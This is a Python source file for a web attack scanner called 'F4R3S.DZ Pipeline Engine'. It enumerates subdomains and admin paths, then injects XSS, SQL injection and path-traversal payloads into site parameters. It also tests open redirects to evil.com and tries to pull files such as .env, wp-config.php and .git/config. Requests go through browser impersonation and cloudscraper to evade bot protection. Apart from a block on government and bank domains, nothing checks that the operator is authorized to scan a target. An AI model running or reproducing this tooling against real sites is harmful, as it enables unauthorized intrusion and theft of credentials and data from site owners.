#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
F4R3S.DZ – Pipeline Engine
"""

import socket
import requests
import re
import time
import random
import concurrent.futures
from urllib.parse import urlparse, urljoin, parse_qs
from datetime import datetime

try:
    from curl_cffi import requests as cffi_requests
    CFFI_AVAILABLE = True
except ImportError:
    CFFI_AVAILABLE = False

try:
    import cloudscraper
    CLOUDSCRAPER_AVAILABLE = True
except ImportError:
    CLOUDSCRAPER_AVAILABLE = False


BLOCKED_DOMAINS = ['.gov', '.gouv', '.govt', '.mil', '.police', '.bank']
MAX_SUBDOMAINS = 100


def smart_fetch(url, max_retries=2):
    """Multi-layer fetch"""
    # 1. Direct
    try:
        r = requests.get(url, timeout=5, verify=False,
                        headers={'User-Agent': 'Mozilla/5.0 Chrome/120'})
        if r.status_code < 500:
            return r
    except:
        pass

    # 2. curl_cffi
    if CFFI_AVAILABLE:
        try:
            r = cffi_requests.get(url, impersonate="chrome", timeout=15)
            if r.status_code < 500:
                return r
        except:
            pass

    # 3. cloudscraper
    if CLOUDSCRAPER_AVAILABLE:
        try:
            scraper = cloudscraper.create_scraper()
            r = scraper.get(url, timeout=15)
            if r.status_code < 500:
                return r
        except:
            pass

    return None


class SubdomainScanner:
    def __init__(self, domain, max_subdomains=100):
        self.domain = domain
        self.max_subdomains = max_subdomains
        self.common_subdomains = [
            'www', 'api', 'admin', 'mail', 'ftp', 'dev', 'test', 'staging',
            'blog', 'shop', 'store', 'app', 'mobile', 'secure', 'portal',
            'dashboard', 'cdn', 'static', 'media', 'images', 'docs', 'support'
        ]

    def scan(self):
        found = []
        with concurrent.futures.ThreadPoolExecutor(max_workers=20) as executor:
            futures = {executor.submit(self._check_subdomain, sub): sub
                      for sub in self.common_subdomains}
            for future in concurrent.futures.as_completed(futures):
                result = future.result()
                if result:
                    found.append(result)
                    if len(found) >= self.max_subdomains:
                        break
        return found

    def _check_subdomain(self, sub):
        full = f"{sub}.{self.domain}"
        try:
            ip = socket.gethostbyname(full)
            return {'subdomain': full, 'ip': ip}
        except:
            return None


class PipelineEngine:
    def __init__(self, target, profile, socketio=None, telegram_id=None):
        self.target = target
        self.profile = profile
        self.socketio = socketio
        self.results = {
            'target': target,
            'subdomains': [],
            'vulnerabilities': [],
            'start_time': datetime.now().isoformat(),
            'end_time': None
        }

        domain = urlparse(target).netloc.lower()
        for blocked in BLOCKED_DOMAINS:
            if blocked in domain:
                raise ValueError(f"Scanning government domains is not allowed")

        self.session = requests.Session()
        self.session.verify = False
        requests.packages.urllib3.disable_warnings()

        self.base_url = target.rstrip('/')
        self.found_paths = []
        self.visited = set()

        self.fake_patterns = [
            '404', 'not found', 'page not found', 'does not exist',
            'forbidden', 'access denied', 'error', 'server error'
        ]

        self.path_wordlist = [
            '', 'index.php', 'index.html', 'admin', 'admin/index.php',
            'admin/login.php', 'wp-admin', 'wp-login.php', 'robots.txt', 'sitemap.xml'
        ]

        self.xss_payloads = [
            "<script>alert(1)</script>",
            "<img src=x onerror=alert(1)>",
            "javascript:alert(1)",
            "'><script>alert(1)</script>",
            "<svg onload=alert(1)>"
        ]

        self.sqli_payloads = [
            "' OR '1'='1",
            "' OR '1'='1' -- ",
            "' UNION SELECT NULL-- ",
            "' AND 1=1-- "
        ]

        self.sql_error_patterns = [
            'sql syntax', 'mysql', 'postgresql', 'ora-',
            'database error', 'unclosed quotation', 'sqlite'
        ]

        self.lfi_payloads = [
            '../../../../etc/passwd',
            '../../../../etc/hosts',
            '../../../../windows/win.ini'
        ]

        self.sensitive_files_wordlist = [
            '.env', 'config.php', 'wp-config.php', 'database.php',
            'backup.sql', '.git/config', 'phpinfo.php', 'shell.php'
        ]

        self.redirect_params = ['redirect', 'url', 'return', 'next', 'goto']
        self.id_params = ['id', 'user_id', 'product_id', 'file_id']
        self.common_params = ['msg', 'page', 'id', 'q', 'search', 'file',
                             'cat', 'product', 'user', 'do', 'cmd']

    def emit_log(self, msg, type='info'):
        if self.socketio:
            try:
                self.socketio.emit('scan_log', {'message': msg, 'type': type})
            except:
                pass

    def emit_progress(self, p, step):
        if self.socketio:
            try:
                self.socketio.emit('pipeline_progress', {'progress': p, 'step': step})
            except:
                pass

    def is_fake_response(self, response):
        if not response:
            return True
        if response.status_code == 404:
            return True
        for pattern in self.fake_patterns:
            if pattern.lower() in response.text.lower():
                return True
        return False

    def is_valid_file_content(self, content, path):
        if len(content) < 50:
            return False
        for pattern in self.fake_patterns:
            if pattern.lower() in content.lower():
                return False
        return True

    def is_reflected(self, payload, text):
        if payload in text:
            return True
        simplified = re.sub(r'[^\w\s]', '', payload)
        if simplified and simplified in text:
            return True
        return False

    def add_vuln(self, **kw):
        for existing in self.results['vulnerabilities']:
            if existing.get('url') == kw.get('url') and existing.get('parameter') == kw.get('parameter'):
                return
        self.results['vulnerabilities'].append(kw)

    def check_alive(self):
        self.emit_log("[*] Checking if target is alive...", 'info')
        response = smart_fetch(self.target)
        if response and response.status_code < 500:
            self.emit_log(f"[+] Target responded: {response.status_code}", 'success')
            return True
        self.emit_log("[!] Target not responding", 'error')
        return False

    def do_recon(self):
        try:
            domain = self.target.split('/')[2]
            ip = socket.gethostbyname(domain)
            self.emit_log(f"[+] Resolved to {ip}")
        except:
            self.emit_log("[!] DNS failed", 'error')
            return

        response = smart_fetch(self.target)
        if response and response.status_code == 200:
            self.emit_log(f"[+] Main page loaded", 'success')
            self.found_paths.append({
                'url': self.target,
                'content': response.text[:3000],
                'status': response.status_code
            })

    def scan_paths(self):
        self.emit_log("[*] Scanning paths...", 'info')
        for p in self.path_wordlist:
            url = urljoin(self.base_url, p)
            if url in self.visited:
                continue
            self.visited.add(url)
            response = smart_fetch(url)
            if response and response.status_code == 200:
                self.emit_log(f"  Found: {p}", 'info')
                self.found_paths.append({
                    'url': url,
                    'content': response.text[:3000],
                    'status': response.status_code
                })

    def scan_xss_all_parameters(self):
        self.emit_log("[*] Scanning XSS...", 'info')
        for page in self.found_paths[:20]:
            url = page['url']
            parsed = urlparse(url)
            base = f"{parsed.scheme}://{parsed.netloc}{parsed.path}"
            if parsed.query:
                for param in parse_qs(parsed.query).keys():
                    self.test_xss_on_parameter(base, param)
            for param in self.common_params:
                self.test_xss_on_parameter(base, param)

    def test_xss_on_parameter(self, base_url, param):
        for payload in self.xss_payloads[:3]:
            test_url = f"{base_url}?{param}={payload}"
            response = smart_fetch(test_url)
            if response and response.status_code == 200:
                if self.is_reflected(payload, response.text):
                    self.emit_log(f"  XSS FOUND: {test_url}", 'error')
                    self.add_vuln(type='XSS', severity='HIGH', url=test_url,
                                parameter=param, payload=payload)
                    return

    def scan_sqli_all_parameters(self):
        self.emit_log("[*] Scanning SQLi...", 'info')
        for page in self.found_paths[:15]:
            url = page['url']
            parsed = urlparse(url)
            base = f"{parsed.scheme}://{parsed.netloc}{parsed.path}"
            for param in ['id', 'page', 'cat', 'product']:
                self.test_sqli_on_parameter(base, param)

    def test_sqli_on_parameter(self, base_url, param):
        for payload in self.sqli_payloads[:3]:
            test_url = f"{base_url}?{param}={payload}"
            response = smart_fetch(test_url)
            if response and response.status_code == 200:
                for pattern in self.sql_error_patterns:
                    if pattern.lower() in response.text.lower():
                        self.emit_log(f"  SQLi FOUND: {test_url}", 'error')
                        self.add_vuln(type='SQL Injection', severity='CRITICAL',
                                    url=test_url, parameter=param, payload=payload)
                        return

    def scan_lfi_all_parameters(self):
        self.emit_log("[*] Scanning LFI...", 'info')
        for page in self.found_paths[:10]:
            url = page['url']
            parsed = urlparse(url)
            base = f"{parsed.scheme}://{parsed.netloc}{parsed.path}"
            for param in ['file', 'page', 'path']:
                for payload in self.lfi_payloads[:2]:
                    test_url = f"{base}?{param}={payload}"
                    response = smart_fetch(test_url)
                    if response and response.status_code == 200:
                        if 'root:' in response.text or '127.0.0.1' in response.text:
                            self.emit_log(f"  LFI FOUND: {test_url}", 'error')
                            self.add_vuln(type='LFI', severity='HIGH',
                                        url=test_url, parameter=param, payload=payload)
                            return

    def scan_idor(self):
        self.emit_log("[*] Scanning IDOR...", 'info')
        for page in self.found_paths[:10]:
            parsed = urlparse(page['url'])
            base = f"{parsed.scheme}://{parsed.netloc}{parsed.path}"
            for param in self.id_params:
                for id_val in [1, 2, 100]:
                    test_url = f"{base}?{param}={id_val}"
                    response = smart_fetch(test_url)
                    if response and response.status_code == 200:
                        if 'user' in response.text.lower() or 'profile' in response.text.lower():
                            self.emit_log(f"  IDOR Possible: {test_url}", 'warning')
                            self.add_vuln(type='IDOR (Possible)', severity='HIGH',
                                        url=test_url, parameter=param)
                            break

    def scan_redirect(self):
        self.emit_log("[*] Scanning Open Redirect...", 'info')
        for page in self.found_paths[:10]:
            parsed = urlparse(page['url'])
            base = f"{parsed.scheme}://{parsed.netloc}{parsed.path}"
            for param in self.redirect_params:
                test_url = f"{base}?{param}=https://evil.com"
                try:
                    response = requests.get(test_url, timeout=5,
                                          allow_redirects=False, verify=False)
                    if response.status_code in [301, 302, 303, 307, 308]:
                        loc = response.headers.get('Location', '')
                        if 'evil.com' in loc:
                            self.emit_log(f"  Open Redirect: {test_url}", 'error')
                            self.add_vuln(type='Open Redirect', severity='MEDIUM',
                                        url=test_url, parameter=param)
                except:
                    pass

    def scan_sensitive_files(self):
        self.emit_log("[*] Scanning sensitive files...", 'info')
        for path in self.sensitive_files_wordlist:
            url = urljoin(self.base_url, path)
            response = smart_fetch(url)
            if not response or self.is_fake_response(response):
                continue
            if response.status_code == 200:
                if self.is_valid_file_content(response.text, path):
                    self.emit_log(f"  SENSITIVE: {url}", 'error')
                    self.add_vuln(type='Sensitive File Exposure',
                                severity='CRITICAL', url=url,
                                description=f'Exposed: {path}')

    def run(self):
        self.emit_log(f"Starting scan on: {self.target}")
        self.emit_progress(0, 'Initializing...')

        if not self.check_alive():
            self.results['end_time'] = datetime.now().isoformat()
            return self.results

        self.emit_log("[*] Scanning subdomains...", 'info')
        sub_scanner = SubdomainScanner(urlparse(self.target).netloc, MAX_SUBDOMAINS)
        self.results['subdomains'] = sub_scanner.scan()
        self.emit_log(f"[+] Found {len(self.results['subdomains'])} subdomains", 'success')

        self.do_recon()
        self.emit_progress(10, 'Recon complete')

        if not self.found_paths:
            self.emit_log("[!] No pages found", 'error')
            self.results['end_time'] = datetime.now().isoformat()
            return self.results

        self.scan_paths()
        self.emit_progress(25, 'Paths complete')

        self.scan_xss_all_parameters()
        self.emit_progress(45, 'XSS complete')

        self.scan_sqli_all_parameters()
        self.emit_progress(60, 'SQLi complete')

        self.scan_lfi_all_parameters()
        self.emit_progress(70, 'LFI complete')

        self.scan_idor()
        self.emit_progress(80, 'IDOR complete')

        self.scan_redirect()
        self.emit_progress(90, 'Redirect complete')

        self.scan_sensitive_files()
        self.emit_progress(98, 'Sensitive files complete')

        self.results['end_time'] = datetime.now().isoformat()
        self.emit_log("Scan completed!", 'success')
        self.emit_progress(100, 'Scan completed!')
        return self.results